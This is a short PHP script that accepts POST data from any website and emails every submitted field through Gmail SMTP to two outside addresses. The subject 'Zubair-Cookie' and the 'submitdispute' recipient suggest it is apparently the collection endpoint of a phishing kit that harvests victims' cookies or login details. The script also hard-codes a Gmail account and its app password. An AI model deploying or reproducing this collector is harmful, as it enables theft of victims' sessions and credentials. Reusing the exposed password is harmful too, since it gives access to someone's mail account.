<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// ==== CORS HEADERS ====
header("Access-Control-Allow-Origin: *"); // You can replace * with your domain
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// ==== Handle Preflight (OPTIONS) Request ====
if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
    http_response_code(200);
    exit();
}

// ==== Load PHPMailer ====
require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

// ==== Only process POST request ====
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $emailBody = '';

    // Detect content type
    $contentType = $_SERVER["CONTENT_TYPE"] ?? '';

    if (stripos($contentType, 'application/json') !== false) {
        // Parse raw JSON input
        $input = json_decode(file_get_contents("php://input"), true);
    } else {
        // Use form-data or x-www-form-urlencoded
        $input = $_POST;
    }

    // Check if input is valid
    if (!empty($input) && is_array($input)) {
        foreach ($input as $key => $value) {
            $emailBody .= ucfirst($key) . ': ' . htmlspecialchars($value) . '<br>';
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Message body empty']);
        exit();
    }

    // ==== Set up PHPMailer ====
    $mail = new PHPMailer(true);

    try {
        // SMTP settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'dardhame1@gmail.com'; // Replace with your Gmail
        $mail->Password   = 'vbbx qrsx uvpo plzl'; // App password, not your Gmail login
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        // Email headers
        $mail->setFrom('dardhame1@gmail.com', 'PROFESSOR');
        $mail->addAddress('submitdispute@gmail.com');
        $mail->addAddress('newzatpage@gmail.com');

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'Zubair-Cookie';
        $mail->Body    = $emailBody;

        // Send the email
        $mail->send();

        echo json_encode(['status' => 'success', 'message' => 'Email sent']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $mail->ErrorInfo]);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
